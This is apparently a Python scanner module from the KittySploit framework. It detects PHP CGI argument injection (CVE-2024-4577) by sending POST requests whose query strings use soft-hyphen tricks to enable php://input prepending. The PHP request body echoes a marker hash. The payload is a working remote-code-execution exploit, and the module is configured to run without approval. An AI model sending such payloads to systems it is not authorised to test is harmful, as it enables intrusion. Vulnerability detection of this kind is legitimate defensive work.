#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHP CGI - Argument Injection (CVE-2024-4577) is a critical argument injection flaw in PHP."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHP CGI - Argument Injection Detection',
        'description': 'PHP CGI - Argument Injection (CVE-2024-4577) is a critical argument injection flaw in PHP.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'modules': [
            'exploits/linux/http/php_cgi_cve_2024_4577_rce',
        ],
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'php', 'cgi', 'rce', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://s4e.io/tools/php-cgi-code-injection-cve-2024-4577',
            'http://www.openwall.com/lists/oss-security/2024/06/07/1',
            'https://blog.orange.tw/2024/06/cve-2024-4577-yet-another-php-rce.html',
            'https://cert.be/en/advisory/warning-php-remote-code-execution-patch-immediately',
        ],
        'cve': 'CVE-2024-4577',
    }

    def run(self):
        for path in ('/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input', '/index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input', '/test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input', '/test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'):
            r = self.http_request(method='POST', path=path, allow_redirects=False, data='<?php echo md5("CVE-2024-4577"); ?>\n')
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('3f2ba4ab3b260f4c2dc61a6fac7c3e8a',)
            if any(m in body for m in body_any):
                self.set_info(
                    severity='critical',
                    reason='PHP CGI - Argument Injection detected',
                    path=path,
                )
                return True
        return False

